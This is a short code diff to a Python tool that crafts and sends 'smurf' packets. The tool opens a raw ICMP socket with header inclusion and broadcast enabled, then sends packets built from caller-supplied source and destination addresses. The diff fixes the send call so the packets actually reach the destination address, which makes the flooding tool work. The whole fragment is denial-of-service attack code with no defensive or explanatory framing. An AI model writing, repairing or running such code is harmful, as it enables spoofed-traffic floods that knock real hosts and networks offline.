@@ -18,13 +18,12 @@ def generate_smurf_packet(source_ip, dest_ip, payload_size=56):
 
 def send_one_smurf(sock, source_ip, dest_ip, payload_size=56):
     packet_data = generate_smurf_packet(source_ip, dest_ip, payload_size)
-    sock.sendto(packet_data, ('', 0))
+    sock.sendto(packet_data, (dest_ip, 0))
 
 
 def _smurf(source_ip, dest_ip, payload_size):
     with socket.socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as sock:
         sock.bind(('', 1))
-        sock.setblocking(0)
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
         send_one_smurf(sock, source_ip, dest_ip, payload_size)
